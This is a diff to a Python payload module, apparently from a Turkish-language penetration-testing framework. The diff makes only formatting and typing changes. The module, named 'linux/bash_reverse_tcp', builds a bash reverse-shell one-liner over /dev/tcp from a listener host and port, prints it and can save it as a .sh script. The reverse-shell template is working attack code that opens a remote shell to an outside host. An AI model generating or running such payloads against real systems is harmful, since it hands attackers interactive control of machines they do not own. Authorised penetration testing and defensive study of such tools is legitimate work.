@@ -1,6 +1,8 @@
+from typing import Any
+
 from core.module import BaseModule
 from core.option import Option
-from typing import Dict, Any
+
 
 class Payload(BaseModule):
     Name = "linux/bash_reverse_tcp"
@@ -13,7 +15,13 @@ class Payload(BaseModule):
         self.Options = {
             "LHOST": Option("LHOST", "127.0.0.1", True, "Dinleyen IP."),
             "LPORT": Option("LPORT", 4444, True, "Dinleyen Port."),
-            "OUTPUT": Option("OUTPUT", "", False, "Payload'ı dosyaya kaydet (örn: shell.sh).", completion_dir=".")
+            "OUTPUT": Option(
+                "OUTPUT",
+                "",
+                False,
+                "Payload'ı dosyaya kaydet (örn: shell.sh).",
+                completion_dir=".",
+            ),
         }
 
     def generate(self) -> str:
@@ -24,9 +32,9 @@ class Payload(BaseModule):
         payload = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
         return payload
 
-    def run(self, options: Dict[str, Any]):
+    def run(self, options: dict[str, Any]):
         code = self.generate()
-        
+
         output_path = self.get_option_value("OUTPUT")
         if output_path:
             if not output_path.endswith(".sh"):
@@ -41,7 +49,7 @@ class Payload(BaseModule):
                 print(f"[!] Dosya yazma hatası: {e}")
                 return code
 
-        print(f"[*] Bash Payload oluşturuldu:")
+        print("[*] Bash Payload oluşturuldu:")
         print("-" * 50)
         print(code)
         print("-" * 50)
